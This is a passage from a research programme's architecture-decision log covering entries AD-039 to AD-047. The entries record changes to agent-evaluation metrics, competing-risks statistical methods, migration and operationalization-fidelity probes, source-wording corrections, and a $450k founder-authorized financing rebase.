*   **Decision:** **MODIFY**
*   **What Changed:** Metric renamed Maximum Dependable Interaction Depth (MDID); causal-path depth declared future instrumentation. Competing-risks primary (Gray's test + Fine-Gray magnitude floor) with KM/Log-Rank demoted to sensitivity; M18 verdict is joint over completion, CIF, MDID ratio, cost, latency. Canonical comparison fixed repo-wide: (C) must beat (B); (A) is a secondary severity reference. Pre-V4 documents keep the old name as history.
*   **Next Experiment:** M18 pre-registration freezes the CIF magnitude floor at pilot calibration.

---

### AD-039: RQ7 Semantic Conformance Probes + Negative Migration
*   **Date:** September 2026
*   **Question:** Preservation rates are trivially gameable by database copying; universal migration success proves serialization, not continuity.
*   **Decision:** **MODIFY**
*   **What Changed:** Mandatory pre/post semantic probes (allow preserved, deny preserved, narrowing enforced, commitments honored, skills re-validated) plus negative incompatible-migration cases where safe refusal/rebinding is the correct outcome.
*   **Next Experiment:** Probe suite construction M19–M20; calibration at M18 pre-registration.

---

### AD-040: RQ8 Contract Integrity vs. Operationalization Fidelity Split
*   **Date:** September 2026
*   **Question:** An intact Goal Contract does not imply faithful operationalization (easy-self-tests proxy trap).
*   **Decision:** **MODIFY**
*   **What Changed:** RQ8 split into Contract Integrity (unauthorized edits = failures) and Operationalization Fidelity (proxy-divergence scoring + hidden-evaluation transfer on frozen principal-authored probes), with trap-pattern tasks in the workload and fidelity-transfer added to candidate metrics.
*   **Next Experiment:** Suite construction M19–M21; calibration at M21 pre-registration.

---

### AD-041: RQ9 Rename + M36-A/B Verdict Split
*   **Date:** September 2026
*   **Question:** "World" in RQ9 implies world-model/robotics scope GIBBRN does not pursue; a single M36 verdict conflates scientific success with company viability.
*   **Decision:** **MODIFY**
*   **What Changed:** RQ9 → "Decision-Sufficient Canonical Operational State" with an explicit non-robotics scope note (Puffin/JEPA as motivating analogy only). M36 split into M36-A (scientific) and M36-B (company) verdict-independent axes across `06` (RQ12, Table 6.2/6.2b), `07`, `08` Table 8.3, `10`, and root README schedule.
*   **Next Experiment:** M36 pre-registration freezes both axes' targets at M33.

---

### AD-042: Source-Hygiene + Table 8.3 Consistency Fixes
*   **Date:** September 2026
*   **Question:** "13 verified primary sources" overclaims (delta mixes papers, a draft, advisories); CONTINUITY/"unoccupied"/Mem0 wordings outran the evidence; Table 8.3 kept a binding M24 ROI row after M24 became objective-integrity/Arc-III-readiness.
*   **Decision:** **MODIFY**
*   **What Changed:** "13 newly verified evidence entries, prioritizing primary sources" repo-wide; CONTINUITY → "independently support in their evaluated setting"; "unoccupied" → "no directly equivalent product was identified in the reviewed competitor set"; Mem0/Letta → "architecturally exposed to analogous poisoning unless separately mitigated" with non-tested-implementation disclaimer (`02`, `09`, `10`). Table 8.3: M24 ROI row demoted to a non-binding commercial checkpoint; binding verdict rows added for M36-A/M36-B. No capital numbers touched.
*   **Next Experiment:** Full citation/source re-audit before workload freeze.

---

## Section 5: V4.2 Statistical Coherence Fixes (Competing-Risks Closure — September 2026)

### AD-043: CIF-Based MDID Redefinition (Option A)
*   **Date:** September 2026
*   **Question:** V4.1 declared completion "NOT censored" while MDID remained a Kaplan-Meier quantile — an incoherent estimator, since naïve KM estimates no absolute incidence correctly under competing risks while still gating M18 as a co-primary.
*   **Decision:** **MODIFY (Option A — cleanest)**
*   **What Changed:** Single binding depth estimand $\text{MDID}_\tau = \max\{k \mid 1 - \hat{F}_1(k) \ge \tau\}$ via Aalen–Johansen CIFs; completion a legitimate terminal state, budget exhaustion the only censoring. Cause-specific KM demoted to a labeled never-binding sensitivity. Gray's = whether, $\Delta F_1(k^*)$ = how much, MDID ratio = depth translation.
*   **Next Experiment:** M18 pre-registration freezes $k^*$ horizon and the $\Delta F_1(k^*)$ floor at pilot calibration.

---

### AD-044: RQ6 Power TBD + Single Magnitude Estimand
*   **Date:** September 2026
*   **Question:** Legacy 0.90/log-rank power basis does not transfer to the joint CIF gate (150×3 may be underpowered for simultaneous criteria); an "sHR OR absolute reduction" floor invites estimand shopping.
*   **Decision:** **MODIFY**
*   **What Changed:** RQ6 power/TBD via competing-risk simulation over incidence, censoring, CIF differences, N, allocation. Primary magnitude frozen to absolute $\Delta F_1(k^*)$ with no interim number quoted; Fine-Gray sHR secondary support only. Table 6.1/6.2/6.2b, power note, and brief/overview updated.
*   **Next Experiment:** Simulation-based power report as an M18 pre-registration deliverable (added to Table 6.2b).

---

### AD-045: Table 6.2 M36 Split Fix
*   **Date:** September 2026
*   **Question:** The M36 row packed two verdicts into six cells against a four-column binding table.
*   **Decision:** **MODIFY**
*   **What Changed:** Split into `M36-A Scientific` and `M36-B Company` rows (capital plan already used this shape). No verdict logic changed.
*   **Next Experiment:** None — formatting/consistency fix.

---

### AD-046: Version Semantics 4.1 + Small Fixes
*   **Date:** September 2026
*   **Question:** Canonical headers said 4.0 while the ledger called the update V4.1; a leftover "Dependency depth" bullet and a duplicated RQ6 null hypothesis survived the rename pass.
*   **Decision:** **MODIFY**
*   **What Changed:** Canonical headers bumped to 4.1; bullet renamed to interaction depth; duplicate H0 removed; $T$-notation residue eliminated.
*   **Next Experiment:** None.

---

## Section 6: V4.2 Capital Rebase (Founder-Authorized Financing — September 2026)

### AD-047: Founder-Authorized V4 Capital Rebase ($450k Current / ~$700k Program / ~$250k Conditional Year-3)
*   **Date:** September 2026
*   **Question:** What financing structure replaces the deliberately unresolved V4 capital model now that the research design is frozen?
*   **Evidence Examined:** 12-RQ / 12-gate frozen scope; V4.2 CIF methodology closure; bottom-up category build ($180k + $120k + $35k + $80k + $54k + $60k + $25k + $20k + $15k + $20k + $91k = $700,000; reserve 13.0%); stage timing ($450k M0–M24 / ~$250k M25–M36, exact internally).
*   **Prior Decision Preserved:** AD-034 (refusal to fabricate before scope freeze) stands as history — it is the reason the rebase waited, not a decision being rewritten.
*   **Decision:** **ADOPT**
*   **Confidence:** 90% (planning model; §13 uncertainty disclosed)
*   **What Changed:** Current Financing Target $450,000 (M0–M24 through the M24 readiness gate); modeled program capitalization ~$700,000; conditional Year-3 requirement ~$250,000 behind the M24 evidence/Arc-III-readiness decision (passing M24 authorizes seeking Year-3 capital, never auto-spends it). Founder-preferred single $450k financing; $250k+$200k split exists strictly as an investor-structured fallback (Arc-II financing-event risk documented). No scientific gate becomes a legal tranche; no escrow/SAFE/valuation terms invented; no RQ, N, arm, or threshold altered to fit finance. V3 $400k/$150k demoted to flagged appendices.
*   **Next Experiment:** None — financing structure. Recalibrate workload-sensitive envelopes at research gates per §13.
